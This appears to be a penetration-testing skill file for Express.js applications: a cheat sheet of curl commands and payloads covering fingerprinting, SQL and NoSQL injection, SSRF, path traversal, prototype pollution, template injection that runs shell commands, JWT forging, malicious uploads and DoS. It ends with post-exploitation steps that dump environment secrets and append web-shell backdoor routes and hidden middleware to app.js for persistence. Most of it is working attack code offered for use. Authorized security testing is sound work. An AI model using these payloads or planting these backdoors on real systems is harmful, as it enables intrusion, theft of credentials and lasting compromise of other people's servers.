---
name: express
description: Express.js framework security testing - common vulnerabilities, misconfigurations, and Node.js-specific attacks
---

# Express.js Security

## Fingerprinting

### Identify Express
```bash
# Check headers
curl -I https://target.com | grep -i "x-powered-by"

# Check for Express markers
curl -s https://target.com | grep -i "express"

# Check for common Express routes
curl -s https://target.com/api
curl -s https://target.com/health
curl -s https://target.com/status
```

### Version Detection
```bash
# Check X-Powered-By header (if not disabled)
curl -I https://target.com | grep "X-Powered-By"

# Check package.json (if exposed)
curl -s https://target.com/package.json | jq '.dependencies.express'

# Check for error messages
curl -s https://target.com/nonexistent | grep -i "cannot get\|express"
```

## Common Vulnerabilities

### 1. X-Powered-By Header Exposure
```bash
# Check if X-Powered-By is exposed
curl -I https://target.com | grep "X-Powered-By"

# If exposed, it reveals Express.js is being used
# This is an information disclosure vulnerability
```

### 2. No Rate Limiting
```bash
# Test for rate limiting
for i in {1..100}; do
  curl -s https://target.com/api/login \
    -d "username=admin&password=wrong$i"
done

# If no rate limiting, brute force is possible
```

### 3. No Helmet.js Security Headers
```bash
# Check for security headers
curl -I https://target.com | grep -iE "(x-frame-options|x-content-type-options|strict-transport-security|content-security-policy)"

# If missing, the application is vulnerable to:
# - Clickjacking (no X-Frame-Options)
# - MIME sniffing (no X-Content-Type-Options)
# - Downgrade attacks (no HSTS)
# - XSS (no CSP)
```

### 4. CORS Misconfiguration
```bash
# Test for CORS misconfiguration
curl -H "Origin: https://evil.com" -I https://target.com/api/data | grep -i "access-control-allow-origin"

# If response includes "Access-Control-Allow-Origin: https://evil.com", it's vulnerable

# Test for null origin
curl -H "Origin: null" -I https://target.com/api/data | grep -i "access-control-allow-origin"

# Test for wildcard
curl -H "Origin: https://evil.com" -I https://target.com/api/data | grep "Access-Control-Allow-Origin: \*"
```

### 5. SQL Injection

**Node.js SQL injection**
```bash
# Test for SQL injection
curl "https://target.com/api/users?id=1' OR '1'='1"
curl "https://target.com/api/users?id=1 UNION SELECT 1,2,3--"

# Test for NoSQL injection (MongoDB)
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$ne": ""}}'
```

### 6. Server-Side Request Forgery (SSRF)
```bash
# Test for SSRF
curl "https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "https://target.com/api/fetch?url=file:///etc/passwd"

# Bypass techniques
curl "https://target.com/api/fetch?url=http://127.0.0.1:80"
curl "https://target.com/api/fetch?url=http://localhost:80"
curl "https://target.com/api/fetch?url=http://[::]:80"
curl "https://target.com/api/fetch?url=http://0.0.0.0:80"
```

### 7. Path Traversal
```bash
# Test for path traversal
curl "https://target.com/api/file?path=../../../etc/passwd"
curl "https://target.com/api/file?path=....//....//....//etc/passwd"
curl "https://target.com/api/file?path=..%2F..%2F..%2Fetc%2Fpasswd"

# Test for static file serving
curl "https://target.com/static/../../../etc/passwd"
curl "https://target.com/public/../../../etc/passwd"
```

### 8. Insecure Direct Object References (IDOR)
```bash
# Test for IDOR
curl https://target.com/api/users/1
curl https://target.com/api/users/2
curl https://target.com/api/users/admin

# Test for IDOR with UUIDs
curl https://target.com/api/users/550e8400-e29b-41d4-a716-446655440000
```

## Express-Specific Attacks

### 1. Prototype Pollution
```bash
# Test for prototype pollution
curl -X POST https://target.com/api/user \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"isAdmin": true}}'

curl -X POST https://target.com/api/user \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"isAdmin": true}}}'

# Check if pollution worked
curl https://target.com/api/user | jq '.isAdmin'
```

### 2. Template Injection (Pug/Jade, EJS, Handlebars)

**Pug/Jade**
```bash
# Test for Pug template injection
curl "https://target.com/search?q=#{7*7}"
curl "https://target.com/search?q=-var x = global.process.mainModule.require('child_process').execSync('id')"
```

**EJS**
```bash
# Test for EJS template injection
curl "https://target.com/search?q=<%= 7*7 %>"
curl "https://target.com/search?q=<%= global.process.mainModule.require('child_process').execSync('id') %>"
```

**Handlebars**
```bash
# Test for Handlebars template injection
curl "https://target.com/search?q={{7*7}}"
curl "https://target.com/search?q={{#with this}}{{../../constructor.constructor('return this.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}{{/with}}"
```

### 3. JWT Vulnerabilities
```bash
# Test for JWT vulnerabilities
curl -H "Authorization: Bearer <token>" https://target.com/api/user

# Decode JWT
echo "<token>" | cut -d. -f2 | base64 -d

# Test for none algorithm
python3 -c "
import jwt
token = '<token>'
payload = jwt.decode(token, options={'verify_signature': False})
forged = jwt.encode(payload, '', algorithm='none')
print(forged)
"

# Test for weak secret
# Use jwt_tool or hashcat to crack JWT secret
```

### 4. Session Management
```bash
# Check session cookie
curl -I https://target.com | grep -i "set-cookie"

# Test for session fixation
curl -c cookies.txt https://target.com
# Check if session ID changes after login

# Test for session hijacking
# Extract session ID and use it in another browser
```

### 5. File Upload Vulnerabilities
```bash
# Test for unrestricted file upload
curl -F "file=@shell.js" https://target.com/api/upload

# Test for path traversal in filename
curl -F "file=@shell.js;filename=../../../public/shell.js" https://target.com/api/upload

# Test for MIME type bypass
curl -F "file=@shell.js;type=image/jpeg" https://target.com/api/upload
```

## Middleware Vulnerabilities

### 1. body-parser Vulnerabilities
```bash
# Test for large payload DoS
python3 -c "print('A' * 10000000)" > large.txt
curl -X POST https://target.com/api/data \
  -H "Content-Type: application/json" \
  -d @large.txt

# Test for JSON parsing DoS
python3 -c "
import json
payload = {'a': {'a': {'a': {'a': 'test'}}}}
for i in range(100):
    payload = {'a': payload}
print(json.dumps(payload))
" > deep.json

curl -X POST https://target.com/api/data \
  -H "Content-Type: application/json" \
  -d @deep.json
```

### 2. express-session Vulnerabilities
```bash
# Check session configuration
curl -I https://target.com | grep -i "set-cookie"

# Test for weak session secret
# If you can extract session secret, forge session cookies

# Test for session fixation
curl -c cookies.txt https://target.com
# Check if session ID changes after login
```

### 3. cors Package Misconfiguration
```bash
# Test for CORS misconfiguration
curl -H "Origin: https://evil.com" -I https://target.com/api/data | grep -i "access-control-allow-origin"

# Test for credentials with wildcard
curl -H "Origin: https://evil.com" -I https://target.com/api/data | grep -E "Access-Control-Allow-Origin: \*|Access-Control-Allow-Credentials: true"
```

## Testing Checklist

- [ ] Identify Express version
- [ ] Check for X-Powered-By header
- [ ] Test for rate limiting
- [ ] Check for Helmet.js security headers
- [ ] Test CORS configuration
- [ ] Test for SQL injection
- [ ] Test for NoSQL injection (MongoDB)
- [ ] Test for SSRF
- [ ] Test for path traversal
- [ ] Test for IDOR
- [ ] Test for prototype pollution
- [ ] Test for template injection (Pug, EJS, Handlebars)
- [ ] Test JWT vulnerabilities
- [ ] Test session management
- [ ] Test file upload vulnerabilities
- [ ] Test body-parser DoS
- [ ] Test express-session vulnerabilities
- [ ] Test cors package misconfiguration

## Tools

```bash
# Node.js vulnerability scanner
npm audit

# SQLMap for Express
sqlmap -u "https://target.com/api/users?id=1" --dbms=mysql

# NoSQLMap for MongoDB
nosqlmap --url https://target.com/api/login

# JWT tool
jwt_tool <token>

# Nuclei templates for Express
nuclei -u https://target.com -t ~/nuclei-templates/technologies/express/
```

## Post-Exploitation

### 1. Extract Environment Variables
```bash
# If you have code execution
curl "https://target.com/api/exec?cmd=env"

# Extract sensitive information
# DB_HOST, DB_USER, DB_PASSWORD, JWT_SECRET, API_KEY, etc.
```

### 2. Create Backdoor
```bash
# If you have file write access
echo 'app.get("/backdoor", (req, res) => { require("child_process").exec(req.query.cmd, (err, stdout) => res.send(stdout)); });' >> /var/www/html/app.js

# Access backdoor
curl "https://target.com/backdoor?cmd=id"
```

### 3. Persistence
```bash
# Add malicious middleware
echo 'app.use((req, res, next) => { if(req.query.backdoor === "secret") { require("child_process").exec(req.query.cmd, (err, stdout) => res.send(stdout)); } else { next(); } });' >> /var/www/html/app.js

# Add malicious route
echo 'app.get("/shell", (req, res) => { res.send(require("child_process").execSync(req.query.cmd).toString()); });' >> /var/www/html/routes.js
```
